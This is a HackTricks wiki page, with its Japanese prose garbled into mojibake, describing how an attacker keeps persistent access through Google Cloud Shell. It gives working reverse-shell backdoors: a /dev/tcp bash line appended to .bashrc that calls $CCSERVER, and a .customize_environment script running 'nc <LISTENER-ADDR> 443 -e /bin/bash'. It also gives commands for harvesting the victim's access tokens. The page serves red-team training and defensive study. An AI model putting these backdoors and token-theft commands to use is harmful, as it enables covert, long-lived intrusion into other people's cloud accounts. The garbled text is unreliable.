# GCP - Cloud Shell Persistence

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Cloud Shell

è©³ç´°ã«ã¤ã„ã¦ã¯ã€æ¬¡ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼š

{% content-ref url="../gcp-services/gcp-cloud-shell-enum.md" %}
[gcp-cloud-shell-enum.md](../gcp-services/gcp-cloud-shell-enum.md)
{% endcontent-ref %}

### Persistent Backdoor

[**Google Cloud Shell**](https://cloud.google.com/shell/) ã¯ã€é–¢é€£ã™ã‚‹ã‚³ã‚¹ãƒˆãªã—ã«ãƒ–ãƒ©ã‚¦ã‚¶ã‹ã‚‰ç›´æ¥ã‚¯ãƒ©ã‚¦ãƒ‰ãƒªã‚½ãƒ¼ã‚¹ã¸ã®ã‚³ãƒãƒ³ãƒ‰ãƒ©ã‚¤ãƒ³ã‚¢ã‚¯ã‚»ã‚¹ã‚’æä¾›ã—ã¾ã™ã€‚

**ã‚¦ã‚§ãƒ–ã‚³ãƒ³ã‚½ãƒ¼ãƒ«**ã‹ã‚‰ã€ã¾ãŸã¯**`gcloud cloud-shell ssh`**ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ã§Googleã®Cloud Shellã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã¾ã™ã€‚

ã“ã®ã‚³ãƒ³ã‚½ãƒ¼ãƒ«ã«ã¯æ”»æ’ƒè€…ã«ã¨ã£ã¦èˆˆå‘³æ·±ã„æ©Ÿèƒ½ãŒã‚ã‚Šã¾ã™ï¼š

1. **Google Cloudã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹ä»»æ„ã®Googleãƒ¦ãƒ¼ã‚¶ãƒ¼**ã¯ã€å®Œå…¨ã«èªè¨¼ã•ã‚ŒãŸCloud Shellã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã¾ã™ï¼ˆã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã¯ã€çµ„ç¹”ã®ã‚ªãƒ¼ãƒŠãƒ¼ã§ã‚ã£ã¦ã‚‚ã‚¢ã‚¯ã‚»ã‚¹å¯èƒ½ã§ã™ï¼‰ã€‚
2. ãã®ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã¯ã€**æ´»å‹•ãŒãªã„å ´åˆã€å°‘ãªãã¨ã‚‚120æ—¥é–“ã¯ãƒ›ãƒ¼ãƒ ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã‚’ç¶­æŒã—ã¾ã™**ã€‚
3. ãã®ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã®æ´»å‹•ã‚’**çµ„ç¹”ãŒç›£è¦–ã™ã‚‹èƒ½åŠ›ã¯ã‚ã‚Šã¾ã›ã‚“**ã€‚

ã“ã‚Œã¯åŸºæœ¬çš„ã«ã€æ”»æ’ƒè€…ãŒãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ›ãƒ¼ãƒ ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã«ãƒãƒƒã‚¯ãƒ‰ã‚¢ã‚’è¨­ç½®ã§ãã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒå°‘ãªãã¨ã‚‚120æ—¥ã”ã¨ã«GC Shellã«æ¥ç¶šã™ã‚‹é™ã‚Šã€ãƒãƒƒã‚¯ãƒ‰ã‚¢ã¯ç”Ÿãæ®‹ã‚Šã€æ”»æ’ƒè€…ã¯å®Ÿè¡Œã™ã‚‹ãŸã³ã«ã‚·ã‚§ãƒ«ã‚’å–å¾—ã§ãã‚‹ã“ã¨ã‚’æ„å‘³ã—ã¾ã™ï¼š

{% code overflow="wrap" %}
```bash
echo '(nohup /usr/bin/env -i /bin/bash 2>/dev/null -norc -noprofile >& /dev/tcp/'$CCSERVER'/443 0>&1 &)' >> $HOME/.bashrc
```
{% endcode %}

ãƒ›ãƒ¼ãƒ ãƒ•ã‚©ãƒ«ãƒ€ã«ã¯ã€**`.customize_environment`** ã¨ã„ã†åˆ¥ã®ãƒ•ã‚¡ã‚¤ãƒ«ãŒã‚ã‚Šã€å­˜åœ¨ã™ã‚‹å ´åˆã¯ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒ **cloud shell** ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ãŸã³ã« **å®Ÿè¡Œã•ã‚Œã¾ã™**ï¼ˆå‰ã®æŠ€è¡“ã¨åŒæ§˜ã«ï¼‰ã€‚å‰ã®ãƒãƒƒã‚¯ãƒ‰ã‚¢ã‚„ã€ä»¥ä¸‹ã®ã‚ˆã†ãªã‚‚ã®ã‚’æŒ¿å…¥ã—ã¦ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒã€Œé »ç¹ã«ã€cloud shell ã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹é™ã‚Šã€æŒç¶šæ€§ã‚’ç¶­æŒã—ã¾ã™ï¼š
```bash
#!/bin/sh
apt-get install netcat -y
nc <LISTENER-ADDR> 443 -e /bin/bash
```
{% hint style="warning" %}
æœ€åˆã«èªè¨¼ã‚’å¿…è¦ã¨ã™ã‚‹ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ãŒå®Ÿè¡Œã•ã‚Œã‚‹ã¨ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ–ãƒ©ã‚¦ã‚¶ã«ãƒãƒƒãƒ—ã‚¢ãƒƒãƒ—èªè¨¼ã‚¦ã‚£ãƒ³ãƒ‰ã‚¦ãŒè¡¨ç¤ºã•ã‚Œã‚‹ã“ã¨ã«æ³¨æ„ã™ã‚‹ã“ã¨ãŒé‡è¦ã§ã™ã€‚ã“ã®ã‚¦ã‚£ãƒ³ãƒ‰ã‚¦ã¯ã€ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹å‰ã«å—ã‘å…¥ã‚Œã‚‰ã‚Œãªã‘ã‚Œã°ãªã‚Šã¾ã›ã‚“ã€‚äºˆæœŸã—ãªã„ãƒãƒƒãƒ—ã‚¢ãƒƒãƒ—ãŒè¡¨ç¤ºã•ã‚Œã‚‹ã¨ã€ç–‘å¿µã‚’å¼•ãèµ·ã“ã—ã€ä½¿ç”¨ã—ã¦ã„ã‚‹æ°¸ç¶šæ€§ã®æ–¹æ³•ãŒå±é™ºã«ã•ã‚‰ã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚
{% endhint %}

ã“ã‚Œã¯ã€ã‚¯ãƒ©ã‚¦ãƒ‰ã‚·ã‚§ãƒ«ã‹ã‚‰ `gcloud projects list` ã‚’å®Ÿè¡Œã—ãŸéš›ã«ï¼ˆæ”»æ’ƒè€…ã¨ã—ã¦ï¼‰ãƒ–ãƒ©ã‚¦ã‚¶ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚»ãƒƒã‚·ãƒ§ãƒ³ã§è¡¨ç¤ºã•ã‚Œã‚‹ãƒãƒƒãƒ—ã‚¢ãƒƒãƒ—ã§ã™ï¼š

<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

ãŸã ã—ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒã‚¯ãƒ©ã‚¦ãƒ‰ã‚·ã‚§ãƒ«ã‚’ç©æ¥µçš„ã«ä½¿ç”¨ã—ã¦ã„ã‚‹å ´åˆã€ãƒãƒƒãƒ—ã‚¢ãƒƒãƒ—ã¯è¡¨ç¤ºã•ã‚Œãšã€æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã§**ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒˆãƒ¼ã‚¯ãƒ³ã‚’åé›†ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™**ï¼š
```bash
gcloud auth print-access-token
gcloud auth application-default print-access-token
```
#### SSHæ¥ç¶šã®ç¢ºç«‹æ–¹æ³•

åŸºæœ¬çš„ã«ã€ã“ã‚Œã‚‰ã®3ã¤ã®APIã‚³ãƒ¼ãƒ«ãŒä½¿ç”¨ã•ã‚Œã¾ã™ï¼š

* [https://content-cloudshell.googleapis.com/v1/users/me/environments/default:addPublicKey](https://content-cloudshell.googleapis.com/v1/users/me/environments/default:addPublicKey) \[POST] (ãƒ­ãƒ¼ã‚«ãƒ«ã§ä½œæˆã—ãŸå…¬é–‹éµã‚’è¿½åŠ ã—ã¾ã™)
* [https://content-cloudshell.googleapis.com/v1/users/me/environments/default:start](https://content-cloudshell.googleapis.com/v1/users/me/environments/default:start) \[POST] (ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã‚’èµ·å‹•ã—ã¾ã™)
* [https://content-cloudshell.googleapis.com/v1/users/me/environments/default](https://content-cloudshell.googleapis.com/v1/users/me/environments/default) \[GET] (Google Cloud Shellã®IPã‚’æ•™ãˆã¦ãã‚Œã¾ã™)

ã•ã‚‰ã«è©³ã—ã„æƒ…å ±ã¯ã€[https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key](https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key)ã§è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

## å‚è€ƒæ–‡çŒ®

* [https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec](https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec)
* [https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key](https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key)
* [https://securityintelligence.com/posts/attacker-achieve-persistence-google-cloud-platform-cloud-shell/](https://securityintelligence.com/posts/attacker-achieve-persistence-google-cloud-platform-cloud-shell/)

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}
